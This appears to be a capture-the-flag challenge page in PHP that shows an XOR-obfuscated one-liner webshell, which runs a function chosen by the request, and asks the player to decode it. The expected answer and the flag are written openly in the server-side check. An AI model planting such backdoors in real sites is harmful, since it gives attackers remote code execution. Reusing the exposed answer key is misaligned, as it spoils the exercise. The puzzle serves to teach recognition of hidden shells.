<?php
	if(isset($_POST['answer'])){
		if($_POST['answer'] == '$_GET[0]($_POST[-1])'){
			echo '<h3>flag{xor_backdoor}</h3>';
		}
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title>what the fuck</title>
	<meta charset="utf-8">
	<link type="text/css" href="../../css/bootstrap-combined.min.css" rel="stylesheet">
</head>
<body>
<h3>Damn it. someone upload a php file,do you know what's this?</h3>
<code>
${("!"^/"~").(":"^"}").("%"^"`").("|"^"(")}[-''](${("?"^"`").("-"^"}").("e"^"*").("/"^"|").("&"^"r")}[(''-1)]);
</code>
<hr/>
<form class="form-horizontal" action="" method="POST">
	<div class="control-group pull-left">
		 <label class="control-label">Answer</label>
		<div class="controls">
			<input type="text" name="answer">
		</div>
	</div>
	<div class="control-group">
		<div class="controls">
			<button type="submit" class="btn">submit</button>
		</div>
	</div>
</form>
</body>
</body>
</html>